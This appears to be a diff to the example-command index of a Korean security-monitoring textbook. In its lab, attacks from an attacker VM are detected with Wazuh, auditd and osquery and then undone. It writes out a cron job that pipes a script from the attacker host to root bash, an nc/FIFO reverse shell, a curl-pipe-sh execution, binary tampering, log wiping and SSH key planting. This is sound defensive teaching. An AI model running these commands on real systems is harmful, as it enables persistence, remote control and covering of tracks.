+9,9.4  제공할 스크립트 준비,C09-27,command,공격자 VM · att 셸,"cat > ~/book09/www/x.sh <<'EOF'
+#!/bin/sh
+printf ""book09-cron user=%s host=%s\n"" \
+""$(id -un)"" ""$(hostname)"" >> /tmp/book09-cron-result
+EOF
+cat ~/book09/www/x.sh",examples/chapter09/C09-27.txt
+9,9.4  제공할 스크립트 준비,C09-28,command,공격자 VM · att 셸,"ss -ltn 'sport = :8000'
+python3 -m http.server 8000 \
+--bind 192.168.0.108 --directory /home/att/book09/www",examples/chapter09/C09-28.txt
+9,9.4  예약 파일 등록,C09-29,command,kt66-bastion · SSH로 접속한 ccc 셸,"curl -fsS --max-time 5 \
+http://192.168.0.108:8000/x.sh",examples/chapter09/C09-29.txt
+9,9.4  예약 파일 등록,C09-30,command,kt66-bastion · root 관리 셸,"service cron start
+service cron status",examples/chapter09/C09-30.txt
+9,9.4  예약 파일 등록,C09-31,command,kt66-bastion · SSH로 접속한 ccc 셸,"printf '%s\n' \
+'* * * * * root /usr/bin/curl -fsS --max-time 5 http://192.168.0.108:8000/x.sh | /bin/bash' \
+| sudo tee /etc/cron.d/book09-lab
+sudo chmod 0644 /etc/cron.d/book09-lab
+cat /etc/cron.d/book09-lab",examples/chapter09/C09-31.txt
+9,9.4  등록 경보와 실행 결과,Q09-05,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND syscheck.path: ""/etc/cron.d/book09-lab""",examples/chapter09/Q09-05.txt
+9,9.4  등록 경보와 실행 결과,C09-32,command,kt66-bastion · SSH로 접속한 ccc 셸,"date -Is
+ls -l /tmp/book09-cron-result
+cat /tmp/book09-cron-result",examples/chapter09/C09-32.txt
+9,9.4  예약 제거와 원상복구,C09-33,command,kt66-bastion · SSH로 접속한 ccc 셸,"cat /etc/cron.d/book09-lab
+sudo rm /etc/cron.d/book09-lab
+ls -l /etc/cron.d/book09-lab",examples/chapter09/C09-33.txt
+9,9.4  예약 제거와 원상복구,C09-34,command,kt66-bastion · SSH로 접속한 ccc 셸,"cat /tmp/book09-cron-result
+sudo rm /tmp/book09-cron-result
+ls -l /tmp/book09-cron-result",examples/chapter09/C09-34.txt
+9,9.4  예약 제거와 원상복구,C09-35,command,kt66-bastion · root 관리 셸,"service cron stop
+service cron status",examples/chapter09/C09-35.txt
+9,9.5  실습 25 · 리버스 셸과 호스트 감사,C09-36,command,kt66 VM · ccc 호스트 셸,"hostname
+cat /proc/self/loginuid
+sudo systemctl is-active auditd wazuh-agent
+sudo auditctl -s
+sudo auditctl -l",examples/chapter09/C09-36.txt
+9,9.5  수집 중단을 먼저 해결하기,C09-37,command,kt66 VM · ccc 호스트 셸,"sudo /var/ossec/bin/wazuh-control status
+sudo grep -n -A 4 -B 2 \
+'audit' /var/ossec/etc/ossec.conf
+sudo tail -n 20 /var/ossec/logs/ossec.log",examples/chapter09/C09-37.txt
+9,9.5  수집 중단을 먼저 해결하기,C09-38,command,kt66 VM · ccc 호스트 셸,"sudo wc -l /var/ossec/etc/client.keys
+sudo grep -n -A 5 '<server>' \
+/var/ossec/etc/ossec.conf",examples/chapter09/C09-38.txt
+9,9.5  수집 중단을 먼저 해결하기,C09-39,command,kt66 VM · ccc 호스트 셸,"sudo /var/ossec/bin/agent-auth \
+-m 10.20.32.100 -A kt66-host
+sudo systemctl start wazuh-agent
+sudo /var/ossec/bin/wazuh-control status",examples/chapter09/C09-39.txt
+9,9.5  연결 도구와 FIFO 준비,C09-40,command,공격자 VM · att 셸,"command -v nc
+nc -h",examples/chapter09/C09-40.txt
+9,9.5  연결 도구와 FIFO 준비,C09-41,command,kt66 VM · ccc 호스트 셸,"command -v nc
+readlink -f /usr/bin/nc
+ls -l /tmp/book09.fifo",examples/chapter09/C09-41.txt
+9,9.5  연결 도구와 FIFO 준비,C09-42,command,공격자 VM · att 셸,"ss -ltn 'sport = :4444'
+timeout 90s nc -lvn 192.168.0.108 4444",examples/chapter09/C09-42.txt
+9,9.5  입력과 응답 확인,C09-43,command,kt66 VM · ccc 호스트 셸,"mkfifo /tmp/book09.fifo
+ls -l /tmp/book09.fifo",examples/chapter09/C09-43.txt
+9,9.5  입력과 응답 확인,C09-44,command,kt66 VM · ccc 호스트 셸,"cat /tmp/book09.fifo | bash -i 2>&1 | \
+nc -N 192.168.0.108 4444 > /tmp/book09.fifo",examples/chapter09/C09-44.txt
+9,9.5  입력과 응답 확인,C09-45,command,공격자 VM · nc 연결 창,"hostname
+id
+exit",examples/chapter09/C09-45.txt
+9,9.5  입력과 응답 확인,C09-46,command,kt66 VM · 연결 종료 후 ccc 셸,"ls -l /tmp/book09.fifo
+rm /tmp/book09.fifo
+ls -l /tmp/book09.fifo
+ss -tn 'dport = :4444'",examples/chapter09/C09-46.txt
+9,9.5  nc 실행 경보 해석,Q09-06,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""kt66-host"" AND rule.groups: ""audit_command"" AND data.audit.execve.a0: ""nc""",examples/chapter09/Q09-06.txt
+9,9.5  부모 프로세스와 Sysmon 보강,Q09-07,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""kt66-host"" AND rule.groups: ""audit_command"" AND data.audit.session: ""82"" AND (data.audit.pid: ""172435"" OR data.audit.ppid: ""172435"")",examples/chapter09/Q09-07.txt
+9,9.5  부모 프로세스와 Sysmon 보강,C09-47,command,kt66 VM · ccc 호스트 셸,"sudo ausearch -if /var/log/audit/audit.log \
+-a 6630 -i",examples/chapter09/C09-47.txt
+9,9.5  부모 프로세스와 Sysmon 보강,C09-48,command,kt66 VM · ccc 호스트 셸,"sudo journalctl -t sysmon \
+--since ""2026-11-03 07:52:25"" \
+--until ""2026-11-03 07:52:28"" --no-pager | \
+grep -F '172438'",examples/chapter09/C09-48.txt
+9,9.6  실습 26 · 다운로드한 응답을 셸로 실행,C09-49,command,공격자 VM · att 셸,"ls -l ~/book09/www/a.sh
+cat > ~/book09/www/a.sh <<'EOF'
+#!/bin/sh
+printf ""book09-payload user=%s host=%s\n"" \
+""$(id -un)"" ""$(hostname)""
+EOF
+cat ~/book09/www/a.sh",examples/chapter09/C09-49.txt
+9,9.6  실습 26 · 다운로드한 응답을 셸로 실행,C09-50,command,kt66 VM · ccc 호스트 셸,"curl -fsS --max-time 5 \
+http://192.168.0.108:8000/a.sh",examples/chapter09/C09-50.txt
+9,9.6  실행 결과와 두 명령의 상태,C09-51,command,kt66 VM · ccc 호스트 셸,"curl -fsS --max-time 5 \
+http://192.168.0.108:8000/a.sh | sh
+printf ""curl and sh status: %s\n"" ""${PIPESTATUS[*]}""",examples/chapter09/C09-51.txt
+9,9.6  실행 결과와 두 명령의 상태,Q09-08,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""kt66-host"" AND rule.groups: ""audit_command"" AND data.audit.execve.a0: ""curl""",examples/chapter09/Q09-08.txt
+9,9.6  같은 부모에서 시작한 curl과 sh,Q09-09,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""kt66-host"" AND rule.groups: ""audit_command"" AND data.audit.session: ""87"" AND (data.audit.pid: ""172868"" OR data.audit.ppid: ""172868"")",examples/chapter09/Q09-09.txt
+9,9.6  HTTP 서버와 임시 키 정리,C09-52,command,공격자 VM · att 셸,"ss -ltn 'sport = :8000 or sport = :4444'
+ls -l ~/book09/book09_key ~/book09/book09_key.pub \
+~/book09/www/x.sh ~/book09/www/a.sh",examples/chapter09/C09-52.txt
+9,9.6  HTTP 서버와 임시 키 정리,C09-53,command,공격자 VM · att 셸,"rm ~/book09/book09_key ~/book09/book09_key.pub \
+~/book09/www/x.sh ~/book09/www/a.sh
+rmdir ~/book09/www ~/book09
+ls -ld ~/book09",examples/chapter09/C09-53.txt
+9,9.7  실습 27 · 실행 파일 변조,C09-54,command,kt66 VM · ccc 호스트 셸,docker exec -it kt66-web /bin/bash,examples/chapter09/C09-54.txt
+9,9.7  실습 27 · 실행 파일 변조,C09-55,command,kt66-web · root 관리 셸,"hostname
+ls -l /usr/bin/yes /root/book09-yes.before
+stat -c ""%s %a %U %G %n"" /usr/bin/yes
+sha256sum /usr/bin/yes
+dpkg -S /usr/bin/yes",examples/chapter09/C09-55.txt
+9,9.7  실습 27 · 실행 파일 변조,C09-56,command,kt66-web · root 관리 셸,dpkg -V coreutils,examples/chapter09/C09-56.txt
+9,9.7  백업과 7바이트 변경,C09-57,command,kt66-web · root 관리 셸,"cp -p /usr/bin/yes /root/book09-yes.before
+cmp /usr/bin/yes /root/book09-yes.before
+printf ""cmp status=%s\n"" ""$?""
+sha256sum /root/book09-yes.before",examples/chapter09/C09-57.txt
+9,9.7  백업과 7바이트 변경,C09-58,command,kt66-web · root 관리 셸,"printf '\x00BOOK09' >> /usr/bin/yes
+stat -c '%s %a %U %G %n' /usr/bin/yes
+sha256sum /usr/bin/yes
+dpkg -V coreutils",examples/chapter09/C09-58.txt
+9,9.7  Wazuh의 변경 전후 값,Q09-10,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND rule.id: ""550"" AND syscheck.path: ""/usr/bin/yes""",examples/chapter09/Q09-10.txt
+9,9.7  바이너리 원상복구,C09-59,command,kt66-web · root 관리 셸,"sha256sum /root/book09-yes.before
+cp -p /root/book09-yes.before /usr/bin/yes
+cmp /root/book09-yes.before /usr/bin/yes
+printf ""cmp status=%s\n"" ""$?""
+stat -c ""%s %a %U %G %n"" /usr/bin/yes
+sha256sum /usr/bin/yes",examples/chapter09/C09-59.txt
+9,9.7  바이너리 원상복구,C09-60,command,kt66-web · root 관리 셸,"dpkg -V coreutils | grep -F -- '/usr/bin/yes'
+rm /root/book09-yes.before
+ls -l /root/book09-yes.before
+exit",examples/chapter09/C09-60.txt
+9,9.8  실습 28 · 로그 삭제와 내용 비우기,C09-61,command,kt66-bastion · SSH로 접속한 ccc 셸,"ls -ld /home/ccc/book09-history
+ls -l /var/log/book09-btmp /var/log/btmp
+sudo sha256sum /var/log/btmp",examples/chapter09/C09-61.txt
+9,9.8  감시할 실습 파일 준비,C09-62,command,kt66-bastion · SSH로 접속한 ccc 셸,"mkdir -m 700 /home/ccc/book09-history
+printf '%s\n' 'echo book09-history' \
+> /home/ccc/book09-history/.bash_history
+sudo cp -p /var/log/btmp /var/log/book09-btmp
+ls -l /home/ccc/book09-history/.bash_history \
+/var/log/book09-btmp",examples/chapter09/C09-62.txt
+9,9.8  감시할 실습 파일 준비,C09-63,command,kt66-bastion · SSH로 접속한 ccc 셸,"cat /home/ccc/book09-history/.bash_history
+> /home/ccc/book09-history/.bash_history
+sudo rm /var/log/book09-btmp
+stat -c ""%s %n"" \
+/home/ccc/book09-history/.bash_history
+ls -l /var/log/book09-btmp",examples/chapter09/C09-63.txt
+9,9.8  삭제 경보와 크기 변경 경보,Q09-11,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND rule.id: ""553"" AND syscheck.path: ""/var/log/book09-btmp""",examples/chapter09/Q09-11.txt
+9,9.8  삭제 경보와 크기 변경 경보,Q09-12,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND syscheck.path: ""/home/ccc/book09-history/.bash_history"" AND syscheck.event: ""modified""",examples/chapter09/Q09-12.txt
+9,9.8  정상 회전과 훼손 조사,C09-64,command,kt66-bastion · SSH로 접속한 ccc 셸,"sudo sha256sum /var/log/btmp
+cat /home/ccc/book09-history/.bash_history
+rm /home/ccc/book09-history/.bash_history
+rmdir /home/ccc/book09-history
+ls -ld /home/ccc/book09-history /var/log/book09-btmp",examples/chapter09/C09-64.txt
+9,9.9  경보를 만든 정의 확인,C09-65,command,kt66 VM · ccc 호스트 셸,docker exec -it kt66-siem /bin/bash,examples/chapter09/C09-65.txt
+9,9.9  경보를 만든 정의 확인,C09-66,command,kt66-siem · root 셸,"sed -n \
+-e '/<rule id=""550""/,/<\/rule>/p' \
+-e '/<rule id=""553""/,/<\/rule>/p' \
+-e '/<rule id=""554""/,/<\/rule>/p' \
+/var/ossec/ruleset/rules/0015-ossec_rules.xml",examples/chapter09/C09-66.txt
+9,9.9  경보를 만든 정의 확인,C09-67,command,kt66-siem · root 셸,"sed -n '/<rule id=""591""/,/<\/rule>/p' \
+/var/ossec/ruleset/rules/0015-ossec_rules.xml",examples/chapter09/C09-67.txt
+9,9.9  audit 디코더·규칙·분류 키,C09-68,command,kt66-siem · root 셸,"sed -n '/<rule id=""80792""/,/<\/rule>/p' \
+/var/ossec/ruleset/rules/0365-auditd_rules.xml
+cat /var/ossec/etc/lists/audit-keys",examples/chapter09/C09-68.txt
+9,9.9  audit 디코더·규칙·분류 키,C09-69,command,kt66-siem · root 셸,"grep -n -A 8 -B 2 -E \
+'auditd-syscall|auditd-execve|<order>audit[.]exe' \
+/var/ossec/ruleset/decoders/0040-auditd_decoders.xml
+exit",examples/chapter09/C09-69.txt
+10,10.1  조사 대상과 실행 위치,C10-01,command,kt66 VM · ccc 호스트 셸,"hostname
+date -Is
+command -v nc ss netstat osqueryi
+systemctl is-active wazuh-agent osqueryd",examples/chapter10/C10-01.txt
+10,10.2  수집 준비와 사전 기록,C10-02,command,kt66 VM · ccc 호스트 셸,"ls -ld ~/book10-state
+sudo ls -l /etc/osquery
+systemctl is-enabled osqueryd wazuh-agent
+sudo iptables -S INPUT
+sudo iptables -S KT66-PERIMETER",examples/chapter10/C10-02.txt
+10,10.2  수집 준비와 사전 기록,C10-03,command,kt66 VM · ccc 호스트 셸,"mkdir -m 700 ~/book10-state
+sudo cp -p /var/ossec/etc/ossec.conf \
+~/book10-state/ossec.conf.before
+sudo sha256sum /var/ossec/etc/ossec.conf",examples/chapter10/C10-03.txt
+10,10.2  osquery 예약 조회 준비,C10-04,command,kt66 VM · ccc 호스트 셸,"sudo cat /etc/osquery/osquery.conf
+cat ~/kt66/deployment/osquery-linux.conf",examples/chapter10/C10-04.txt
+10,10.2  osquery 예약 조회 준비,C10-05,command,kt66 VM · ccc 호스트 셸,"sudo install -m 0644 \
+~/kt66/deployment/osquery-linux.conf \
+/etc/osquery/osquery.conf
+sudo osqueryi \
+--config_path=/etc/osquery/osquery.conf --config_check",examples/chapter10/C10-05.txt
+10,10.2  Wazuh 수집 설정 확인,C10-06,command,kt66 VM · ccc 호스트 셸,"sudo sed -n '/<wodle name=""osquery"">/,/<\/wodle>/p' \
+/var/ossec/etc/ossec.conf
+sudo grep -n -F '/var/log/kern.log' \
+/var/ossec/etc/ossec.conf",examples/chapter10/C10-06.txt
+10,10.2  Wazuh 수집 설정 확인,C10-07,command,kt66 VM · ccc 호스트 셸,sudo nano /var/ossec/etc/ossec.conf,examples/chapter10/C10-07.txt
+10,10.2  수집 항목과 적용 확인,C10-08,command,kt66 VM · ccc 호스트 셸,"sudo /var/ossec/bin/wazuh-logcollector -t
+sudo /var/ossec/bin/wazuh-modulesd -t
+sudo systemctl start osqueryd
+sudo systemctl restart wazuh-agent
+systemctl is-active osqueryd wazuh-agent",examples/chapter10/C10-08.txt
+10,10.2  결과 파일과 조회 주기,C10-09,command,kt66 VM · ccc 호스트 셸,"sudo tail -n 3 /var/log/osquery/osqueryd.results.log
+sudo grep -n -E \
+'netstat|<alias>|<frequency>' \
+/var/ossec/etc/ossec.conf",examples/chapter10/C10-09.txt
+10,10.3  새 리스닝 포트 만들기,C10-10,command,kt66 VM · ccc 호스트 셸,sudo ss -lntp 'sport = :31337',examples/chapter10/C10-10.txt
+10,10.3  새 리스닝 포트 만들기,C10-11,command,kt66 VM · ccc 호스트 셸 · 터미널 A,nc -lk 192.168.0.107 31337,examples/chapter10/C10-11.txt
+10,10.3  새 리스닝 포트 만들기,C10-12,command,kt66 VM · ccc 호스트 셸 · 터미널 B,sudo ss -lntp 'sport = :31337',examples/chapter10/C10-12.txt
+10,10.3  현재 프로세스와 주소 읽기,C10-13,command,kt66 VM · ccc 호스트 셸,"ps -p 181571 -o pid,ppid,user,lstart,args",examples/chapter10/C10-13.txt
+10,10.3  Wazuh에서 목록 변화 찾기,Q10-01,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host"" AND rule.id:533",examples/chapter10/Q10-01.txt
+10,10.3  전후 목록과 실행 흔적 연결,Q10-02,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host"" AND rule.id:533
+AND (full_log:*31337* OR previous_output:*31337*)",examples/chapter10/Q10-02.txt
+10,10.3  전후 목록과 실행 흔적 연결,Q10-03,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host""
+AND rule.groups:audit_command
+AND data.audit.command:nc",examples/chapter10/Q10-03.txt
+10,10.4  kt66 경계 방화벽 확인,C10-14,command,kt66 VM · ccc 호스트 셸,"sudo iptables -S INPUT
+sudo iptables -S KT66-PERIMETER
+ip -4 route get 192.168.0.108
+cat ~/kt66/deployment/perimeter.sh",examples/chapter10/C10-14.txt
+10,10.4  누락된 경계 방화벽 준비,C10-15,command,kt66 VM · ccc 호스트 셸,"sudo iptables-save > ~/book10-state/iptables.before
+sudo bash ~/kt66/deployment/perimeter.sh
+sudo iptables -S INPUT
+sudo iptables -S KT66-PERIMETER",examples/chapter10/C10-15.txt
+10,10.4  누락된 경계 방화벽 준비,C10-16,command,kt66 VM · ccc 호스트 셸,"systemctl is-active rsyslog
+sudo tail -n 3 /var/log/kern.log",examples/chapter10/C10-16.txt
+10,10.4  공격자 VM에서 스캔하기,C10-17,command,공격자 VM · att 셸,"command -v nmap
+nmap --version",examples/chapter10/C10-17.txt
+10,10.4  공격자 VM에서 스캔하기,C10-18,command,공격자 VM · att 셸,"sudo apt-get update
+sudo apt-get install nmap",examples/chapter10/C10-18.txt
+10,10.4  공격자 VM에서 스캔하기,C10-19,command,공격자 VM · att 셸,"date -Is
+nmap -sT -Pn -n -p 1-1000 \
+--max-retries 1 192.168.0.107",examples/chapter10/C10-19.txt
+10,10.4  스캔 응답과 커널 원문,C10-20,command,kt66 VM · ccc 호스트 셸,"sudo grep -F 'SRC=192.168.0.108 ' \
+/var/log/kern.log | tail -n 5",examples/chapter10/C10-20.txt
+10,10.5  반복 차단 경보 읽기,Q10-04,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host"" AND rule.id:4151
+AND data.srcip:""192.168.0.108""",examples/chapter10/Q10-04.txt
+10,10.5  규칙 조건과 누락 범위,C10-21,command,kt66 VM · ccc 호스트 셸,docker exec -it kt66-siem /bin/bash,examples/chapter10/C10-21.txt
+10,10.5  규칙 조건과 누락 범위,C10-22,command,kt66-siem · root 셸,"sed -n '1,40p' \
+/var/ossec/ruleset/rules/0900-firewall_rules.xml
+exit",examples/chapter10/C10-22.txt
+10,10.5  개별 차단 기록으로 범위 조사,Q10-05,query,Windows · Discover · wazuh-archives-*,"agent.name:""kt66-host""
+AND location:""/var/log/kern.log""
+AND data.action:DROP
+AND data.srcip:""192.168.0.108""",examples/chapter10/Q10-05.txt
+10,10.5  추가 조사와 방화벽 원상복구,C10-23,command,kt66 VM · ccc 호스트 셸,"sudo iptables -S INPUT
+sudo iptables -D INPUT -i ens33 -j KT66-PERIMETER
+sudo iptables -F KT66-PERIMETER
+sudo iptables -X KT66-PERIMETER
+sudo iptables -S INPUT",examples/chapter10/C10-23.txt
+10,10.6  SQL로 현재 상태 직접 조회,C10-24,command,kt66 VM · ccc 호스트 셸,sudo osqueryi,examples/chapter10/C10-24.txt
+10,10.6  SQL로 현재 상태 직접 조회,S10-01,query,kt66 VM · sudo osqueryi의 osquery> 프롬프트,"SELECT p.pid, p.name, p.path, l.address, l.port
+FROM listening_ports l
+JOIN processes p USING (pid)
+WHERE l.port IN (31337,31338);",examples/chapter10/S10-01.txt
+10,10.6  예약 SQL의 범위 읽기,S10-02,query,kt66 VM · sudo osqueryi의 osquery> 프롬프트,".schema authorized_keys
+.schema users",examples/chapter10/S10-02.txt
+10,10.6  공개 키와 사용자 연결,S10-03,query,kt66 VM · sudo osqueryi의 osquery> 프롬프트,"SELECT u.username, k.key_file,
+       k.algorithm, k.comment
+FROM users u
+CROSS JOIN authorized_keys k USING (uid)
+WHERE u.uid >= 1000 OR u.uid = 0;",examples/chapter10/S10-03.txt
+10,10.6  공개 키와 사용자 연결,S10-04,query,kt66 VM · sudo osqueryi의 osquery> 프롬프트,.quit,examples/chapter10/S10-04.txt
+10,10.7  새 포트와 공개 키 관찰,C10-25,command,kt66 VM · ccc 호스트 셸,ls -l ~/book10-key.pub ~/book10-authorized_keys.before,examples/chapter10/C10-25.txt
+10,10.7  새 포트와 공개 키 관찰,C10-26,command,공격자 VM · att 셸,"ls -l ~/book10-key ~/book10-key.pub
+ssh-keygen -t ed25519 -N '' \
+-C book10-key@attacker -f ~/book10-key
+ssh-keygen -lf ~/book10-key.pub",examples/chapter10/C10-26.txt
+10,10.7  새 포트와 공개 키 관찰,C10-27,command,공격자 VM · att 셸,"scp ~/book10-key.pub \
+ccc@192.168.0.107:book10-key.pub",examples/chapter10/C10-27.txt
+10,10.7  키 파일 사전 확인과 백업,C10-28,command,kt66 VM · ccc 호스트 셸,"ls -ld ~/.ssh
+ls -l ~/.ssh/authorized_keys ~/book10-key.pub
+ssh-keygen -lf ~/book10-key.pub
+sha256sum ~/.ssh/authorized_keys",examples/chapter10/C10-28.txt
+10,10.7  키 파일 사전 확인과 백업,C10-29,command,kt66 VM · ccc 호스트 셸,"mkdir -p ~/.ssh
+chmod 700 ~/.ssh
+touch ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys",examples/chapter10/C10-29.txt
+10,10.7  키 파일 사전 확인과 백업,C10-30,command,kt66 VM · ccc 호스트 셸,"ls -l ~/book10-authorized_keys.before
+cp -p ~/.ssh/authorized_keys \
+~/book10-authorized_keys.before
+cmp ~/.ssh/authorized_keys \
+~/book10-authorized_keys.before",examples/chapter10/C10-30.txt
+10,10.7  제한된 실습 키 등록,C10-31,command,kt66 VM · ccc 호스트 셸,"printf '\n%s ' 'restrict,from=""192.168.0.108""' \
+>> ~/.ssh/authorized_keys
+cat ~/book10-key.pub >> ~/.ssh/authorized_keys
+ssh-keygen -lf ~/.ssh/authorized_keys",examples/chapter10/C10-31.txt
+10,10.7  제한된 실습 키 등록,C10-32,command,kt66 VM · ccc 호스트 셸 · 터미널 C,"sudo ss -lntp 'sport = :31338'
+nc -lk 192.168.0.107 31338",examples/chapter10/C10-32.txt
+10,10.7  예약 결과에서 추가 행 찾기,Q10-06,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host"" AND rule.groups:osquery
+AND data.osquery.name:
+(kt66_listening_ports OR kt66_authorized_keys)
+AND data.osquery.action:added",examples/chapter10/Q10-06.txt
+10,10.7  예약 결과에서 추가 행 찾기,Q10-07,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host""
+AND data.osquery.name:kt66_listening_ports
+AND data.osquery.columns.port:31338
+AND data.osquery.action:added",examples/chapter10/Q10-07.txt
+10,10.7  공개 키 결과의 의미,Q10-08,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host""
+AND data.osquery.name:kt66_authorized_keys
+AND data.osquery.columns.comment:
+""book10-key@attacker""
+AND data.osquery.action:added",examples/chapter10/Q10-08.txt
+10,10.8  실습 포트와 키 원상복구,C10-33,command,kt66 VM · ccc 호스트 셸,"sudo ss -lntp \
+'( sport = :31337 or sport = :31338 )'",examples/chapter10/C10-33.txt
+10,10.8  실습 포트와 키 원상복구,C10-34,command,kt66 VM · ccc 호스트 셸,"cp -p ~/book10-authorized_keys.before \
+~/.ssh/authorized_keys
+cmp ~/book10-authorized_keys.before \
+~/.ssh/authorized_keys
+sha256sum ~/.ssh/authorized_keys",examples/chapter10/C10-34.txt
+10,10.8  처음 만든 키 파일 정리,C10-35,command,kt66 VM · ccc 호스트 셸,"wc -c ~/.ssh/authorized_keys
+rm ~/.ssh/authorized_keys
+ls -l ~/.ssh/authorized_keys",examples/chapter10/C10-35.txt
+10,10.8  처음 만든 키 파일 정리,C10-36,command,kt66 VM · ccc 호스트 셸,"ls -la ~/.ssh
+rmdir ~/.ssh
+ls -ld ~/.ssh",examples/chapter10/C10-36.txt
+10,10.8  사라진 행과 현재 상태 대조,Q10-09,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host""
+AND data.osquery.name:kt66_listening_ports
+AND data.osquery.columns.port:(31337 OR 31338)
+AND data.osquery.action:removed",examples/chapter10/Q10-09.txt
+10,10.8  사라진 행과 현재 상태 대조,Q10-10,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host""
+AND data.osquery.name:kt66_authorized_keys
+AND data.osquery.columns.comment:
+""book10-key@attacker""
+AND data.osquery.action:removed",examples/chapter10/Q10-10.txt
+10,10.8  임시 파일과 수집 준비 원상복구,C10-37,command,kt66 VM · ccc 호스트 셸,"ls -l ~/book10-key.pub ~/book10-authorized_keys.before
+rm ~/book10-key.pub ~/book10-authorized_keys.before
+ls -l ~/book10-key.pub ~/book10-authorized_keys.before",examples/chapter10/C10-37.txt
+10,10.8  임시 파일과 수집 준비 원상복구,C10-38,command,공격자 VM · att 셸,"ls -l ~/book10-key ~/book10-key.pub
+rm ~/book10-key ~/book10-key.pub
+ls -l ~/book10-key ~/book10-key.pub",examples/chapter10/C10-38.txt
+10,10.8  임시 파일과 수집 준비 원상복구,C10-39,command,kt66 VM · ccc 호스트 셸,"sudo cp -p ~/book10-state/ossec.conf.before \
+/var/ossec/etc/ossec.conf
+sudo cmp ~/book10-state/ossec.conf.before \
+/var/ossec/etc/ossec.conf
+sudo /var/ossec/bin/wazuh-logcollector -t
+sudo /var/ossec/bin/wazuh-modulesd -t
+sudo systemctl restart wazuh-agent",examples/chapter10/C10-39.txt
+10,10.8  서비스와 설정 파일 정리,C10-40,command,kt66 VM · ccc 호스트 셸,"sudo systemctl stop osqueryd
+systemctl is-active osqueryd
+sudo ls -l /etc/osquery/osquery.conf \
+/etc/osquery/osquery.flags",examples/chapter10/C10-40.txt
+10,10.8  서비스와 설정 파일 정리,C10-41,command,kt66 VM · ccc 호스트 셸,"sudo rm /etc/osquery/osquery.conf \
+/etc/osquery/osquery.flags
+sudo ls -l /etc/osquery",examples/chapter10/C10-41.txt
+10,10.9  결과가 다를 때의 확인 순서,C10-42,command,kt66 VM · ccc 호스트 셸,"sudo journalctl -u osqueryd -n 30 --no-pager
+sudo tail -n 30 /var/ossec/logs/ossec.log",examples/chapter10/C10-42.txt
+10,10.9  원문과 정의 연결하기,C10-43,command,kt66 VM · ccc 호스트 셸,docker exec -it kt66-siem /bin/bash,examples/chapter10/C10-43.txt
+10,10.9  원문과 정의 연결하기,C10-44,command,kt66-siem · root 셸,"sed -n '1,65p' \
+/var/ossec/ruleset/decoders/0140-kernel_decoders.xml
+sed -n '/id=""530""/,/id=""534""/p' \
+/var/ossec/ruleset/rules/0015-ossec_rules.xml
+sed -n '1,40p' \
+/var/ossec/ruleset/rules/0545-osquery_rules.xml
+exit",examples/chapter10/C10-44.txt
+11,11.3  검색 조건부터 기록하기,Q11-01,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND
+data.srcip: ""192.168.0.108"" AND
+(rule.id: ""5760"" OR rule.id: ""5715"")",examples/chapter11/Q11-01.txt
+11,11.5  사례 B의 공개 키 변경,Q11-02,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND rule.groups: ""syscheck"" AND syscheck.path: ""/home/ccc/.ssh/authorized_keys""",examples/chapter11/Q11-02.txt
+11,11.5  사례 B의 공개 키 변경,Q11-03,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""bastion"" AND rule.id: ""5715"" AND data.dstuser: ""ccc"" AND data.srcip: ""192.168.0.108"" AND full_log: ""Accepted publickey""",examples/chapter11/Q11-03.txt
+11,11.6  사례 C의 세 수집원,Q11-04,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host"" AND rule.id:533
+AND (full_log:*31337* OR previous_output:*31337*)",examples/chapter11/Q11-04.txt
+11,11.6  스캔 범위를 과장하지 않기,Q11-05,query,Windows · Discover · wazuh-alerts-*,"agent.name:""kt66-host"" AND rule.id:4151
+AND data.srcip:""192.168.0.108""",examples/chapter11/Q11-05.txt
+11,11.6  스캔 범위를 과장하지 않기,Q11-06,query,Windows · Discover · wazuh-archives-*,"agent.name:""kt66-host""
+AND location:""/var/log/kern.log""
+AND data.action:DROP
+AND data.srcip:""192.168.0.108""",examples/chapter11/Q11-06.txt
+11,11.7  증거 사본을 준비하기,C11-01,command,Windows · PowerShell · 저장소 루트,"Get-Location
+Test-Path .\book11-analysis
+Get-ChildItem .\examples\chapter11\evidence",examples/chapter11/C11-01.txt
+11,11.7  증거 사본을 준비하기,C11-02,command,Windows · PowerShell · 저장소 루트,"New-Item -ItemType Directory .\book11-analysis
+Copy-Item .\examples\chapter11\evidence\*.json `
+  .\book11-analysis\
+Get-ChildItem .\book11-analysis",examples/chapter11/C11-02.txt
+11,11.7  해시와 원본 위치 기록,C11-03,command,Windows · PowerShell · 저장소 루트,"Get-FileHash .\book11-analysis\case-a.json `
+  -Algorithm SHA256
+Get-Content .\book11-analysis\manifest.json",examples/chapter11/C11-03.txt
+11,11.7  원문과 필드를 직접 읽기,C11-04,command,Windows · PowerShell · 저장소 루트,"$caseA = Get-Content -Raw `
+  .\book11-analysis\case-a.json | ConvertFrom-Json
+$caseA | Select-Object -First 1 | Format-List *",examples/chapter11/C11-04.txt
+11,11.7  원문과 필드를 직접 읽기,C11-05,command,Windows · PowerShell · 저장소 루트,"$caseA[0].agent | Format-List *
+$caseA[0].data | Format-List *
+$caseA[0].full_log",examples/chapter11/C11-05.txt
